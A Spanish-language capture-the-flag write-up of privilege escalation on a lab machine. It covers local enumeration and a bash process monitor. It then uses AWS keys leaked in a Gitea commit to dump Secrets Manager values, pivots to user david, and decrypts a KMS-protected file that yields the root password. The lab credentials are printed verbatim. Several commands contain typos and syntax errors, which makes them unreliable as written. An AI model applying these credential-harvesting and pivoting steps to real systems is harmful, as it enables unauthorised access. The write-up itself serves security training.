## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
ls
id
sudo -l
pwd
find \-type f 2>/dev/null
```

buscamos para puertos abiertos

```bash
netstat -nat
```

aqui vamos a pasar por `/proc/net/tcp` y passar de **hex** a **decimal** con bash.

1. Copiamos el `/proc/net/tcp` en un fichero data_hex

    ```bash
    cat /proc/net/tcp
    ```

1. recuperamos los puertos

    ```bash
    cat data_hex | awk '{print $2}'
    cat data_hex | awk '{print $2}' | tr ':' ' '
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'
    cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u
    ```

1. Passamos del hexadecimal al decimal con bash

    ```bash
    for hex_port in $(cat data_hex | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' | sort -u); do echo "obase=10; ibase=16; $hex_port" | bc; done
    ```

Continuamos la enumeracion

```bash
cd /
find \-perm -4000 2>/dev/null
ls -la /var
ls -la /opt
ls -la /opt/containerd
ps -faux
ifconfig

cat /home/bot/bot.py
```
El `ps -faux` nos muestra un commando python a un fichero que no existe en esta maquina. Pensamos en un docker o algo parecido.
Aqui no vemos nada interessante. Vamos a crearnos un procmon en bash

```bash
cd /dev/shm
touch procmon.sh
chmod +x procmon.sh
vi procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command|kworker"
    old_process=$new_process
done
```

Aqui tampoco vemos nada interessante. Miramos si tenemos binarios installados que corresponden a lo que hemos encontrado en el **GITEA**.

```bash
which aws
```

Vemos que tenemos **aws** installado y en un commit del repository `Log_Manager` podemos ver credenciales con un secret contra un endpoint en el puerto 4566.

```bash
netstat -nat | grep "4566"

aws help
aws secrectsmanager help
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui vemos que tenemos primero que configurar el commando aws.

```bash
aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets
```

Aqui ya podemos listar los secretos y recuperamos la data interesante

```bash
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"'
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN"
aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"'
```

Ahora que tenemos un listado de **ARN** podemos usar del commando `get-secret-value` para cada **ARN**.

```bash
#!/bin/bash

aws --endpoint-url="http://127.0.0.1:4566" secrectsmanager list-secrets | grep "ARN" | grep -v "RotationLambdaARN" | grep -oP '".*?"' | grep -v "ARN" | tr -d '"' while read aws_secret_key; do
    echo -e "\n[+] Mostrando secreto con el secret_key $aws_secret_key:\n"
    aws --endpoint-url="http://127.0.0.1:4566" secretsmanager get-secret-value --secret-id "$aws_secret_key"
done
```

Aqui podemos ver credenciales y como el usuario **david** esta en el systema intentamos con la credencial encontrada

```bash
su david
Password: EALB=bcC=`a7f2#k
```

Ya hemos podido pivotar al usuario **david** y vemos que en su directorio tiene un proyecto con un fichero encodeado. Vamos a intentar decodearlo con
**aws**.

```bash
cd Projects/Prod_Deployment
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys


aws configure

AWS Access Key ID [None]: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key [None]: 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
Default region name [None]: eu
Default option format [None]:

aws --endpoint-url="http://127.0.0.1:4566" kms list-keys
```

Si miramos la funccionalidad de decrypt del aws, vemos que necessitamos una key_id para desencryptar un fichero.

```bash
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid"
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"'
aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ','
```

Vamos a crear otro script para desencryptar el fichero.

```bash
touch decryptor.sh
chmod +x !$
nano decryptor.sh


#!/bin/bash

declare -a algorithms=(SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256)

for algo in "${algorithms[@]}"; do
    aws --endpoint-url="http://127.0.0.1:4566" kms list-keys | grep -i "keyid" | awk 'NF{print $NF}' | tr -d '"' | tr -d ',' | while read key_id; do
        echo -e "\n[+] Probando con el algoritmo $algo la key $key_id:\n"
        aws --endopoint="http://127.0.0.1:4566 kms decrypt --encryption-algorithm $algo --ciphertext-blob fileb:///home/david/Projects/Prod_Deployement/servers.enc --key-id "$key_id"
    done
done
```

Lanzamos el script y vemos el resultado que es un plaintext en base64. Lo desencryptamos en un fichero, y con el commando `file` vemos que el fichero es un gzip.

```bash
echo "..." | base64 -d > file
file file
mv file file.gz
which gunzip
gunzip file.gz
cat file
```

Aqui vemos una contraseña y probamos si es la contraseña del usuario root

```bash
su root
Password: _uezduQ!EY5AHfe2
```

Somos root y podemos ver la flag

